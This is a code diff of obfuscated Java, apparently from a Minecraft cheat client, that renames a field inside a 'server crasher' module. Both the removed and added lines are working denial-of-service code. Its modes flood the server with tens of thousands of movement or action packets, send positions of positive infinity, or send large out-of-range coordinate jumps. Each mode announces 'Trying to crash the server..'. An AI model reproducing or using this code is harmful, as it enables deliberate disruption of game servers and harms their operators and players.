@@ -16,21 +16,21 @@ public class class_1931 extends class_367 {
    @class_9148
    private void method_8971(class_5596 var1) {
       if (this.method_42015()) {
-         if (field_46692.method_8520()) {
+         if (mcInstance.method_8520()) {
             this.method_41999();
          } else {
             String var4 = this.method_42016("Mode");
             switch (var4) {
                case "Flying Enabled":
-                  double var6 = field_46692.field_9632.method_37302();
-                  double var8 = field_46692.field_9632.method_37309();
-                  double var10 = field_46692.field_9632.method_37156();
+                  double var6 = mcInstance.field_9632.method_37302();
+                  double var8 = mcInstance.field_9632.method_37309();
+                  double var10 = mcInstance.field_9632.method_37156();
                   double var12 = 0.0;
                   double var14 = 0.0;
 
                   for (int var26 = 0; var26 < 50000; var26++) {
                      var14 = (double)(var26 * 7);
-                     field_46692.method_8614().method_4813(new class_9515(var6 - var14, var8 + var12, var10 + var14, false));
+                     mcInstance.method_8614().method_4813(new class_9515(var6 - var14, var8 + var12, var10 + var14, false));
                   }
 
                   class_6324.method_28832("Trying to crash the server..");
@@ -41,7 +41,7 @@ public class class_1931 extends class_367 {
                      this.field_9875 = 0;
 
                      for (int var25 = 0; var25 < 100000; var25++) {
-                        field_46692.method_8614().method_4813(new class_3195(class_2584.field_12791));
+                        mcInstance.method_8614().method_4813(new class_3195(class_2584.field_12791));
                      }
 
                      class_6324.method_28832("Trying to crash the server..");
@@ -71,7 +71,7 @@ public class class_1931 extends class_367 {
 
                   for (int var28 = 0; var28 < 100; var28++) {
                      try {
-                        field_46692.method_8614().method_4813(new class_6362(0, var16));
+                        mcInstance.method_8614().method_4813(new class_6362(0, var16));
                      } catch (Exception var23) {
                      }
                   }
@@ -79,27 +79,27 @@ public class class_1931 extends class_367 {
                   this.method_41999();
                   break;
                case "Infinity":
-                  field_46692.method_8614().method_4813(new class_9515(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
+                  mcInstance.method_8614().method_4813(new class_9515(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                   class_6324.method_28832("Trying to crash the server..");
                   this.method_41999();
                   break;
                case "BrainFreeze":
-                  field_46692.method_8614()
+                  mcInstance.method_8614()
                      .method_4813(
                         new class_9515(
-                           field_46692.field_9632.method_37302() + 9999.0,
-                           field_46692.field_9632.method_37309() + 9999.0,
-                           field_46692.field_9632.method_37156() + 9999.0,
+                           mcInstance.field_9632.method_37302() + 9999.0,
+                           mcInstance.field_9632.method_37309() + 9999.0,
+                           mcInstance.field_9632.method_37156() + 9999.0,
                            false
                         )
                      );
-                  field_46692.method_8614()
+                  mcInstance.method_8614()
                      .method_4813(
                         new class_9515(
-                           field_46692.field_9632.method_37302(),
-                           field_46692.field_9632.method_37241().field_19937,
-                           field_46692.field_9632.method_37156() + 9999.0,
-                           field_46692.field_9632.field_41726
+                           mcInstance.field_9632.method_37302(),
+                           mcInstance.field_9632.method_37241().field_19937,
+                           mcInstance.field_9632.method_37156() + 9999.0,
+                           mcInstance.field_9632.field_41726
                         )
                      );
                   if (this.field_9875++ >= 200) {
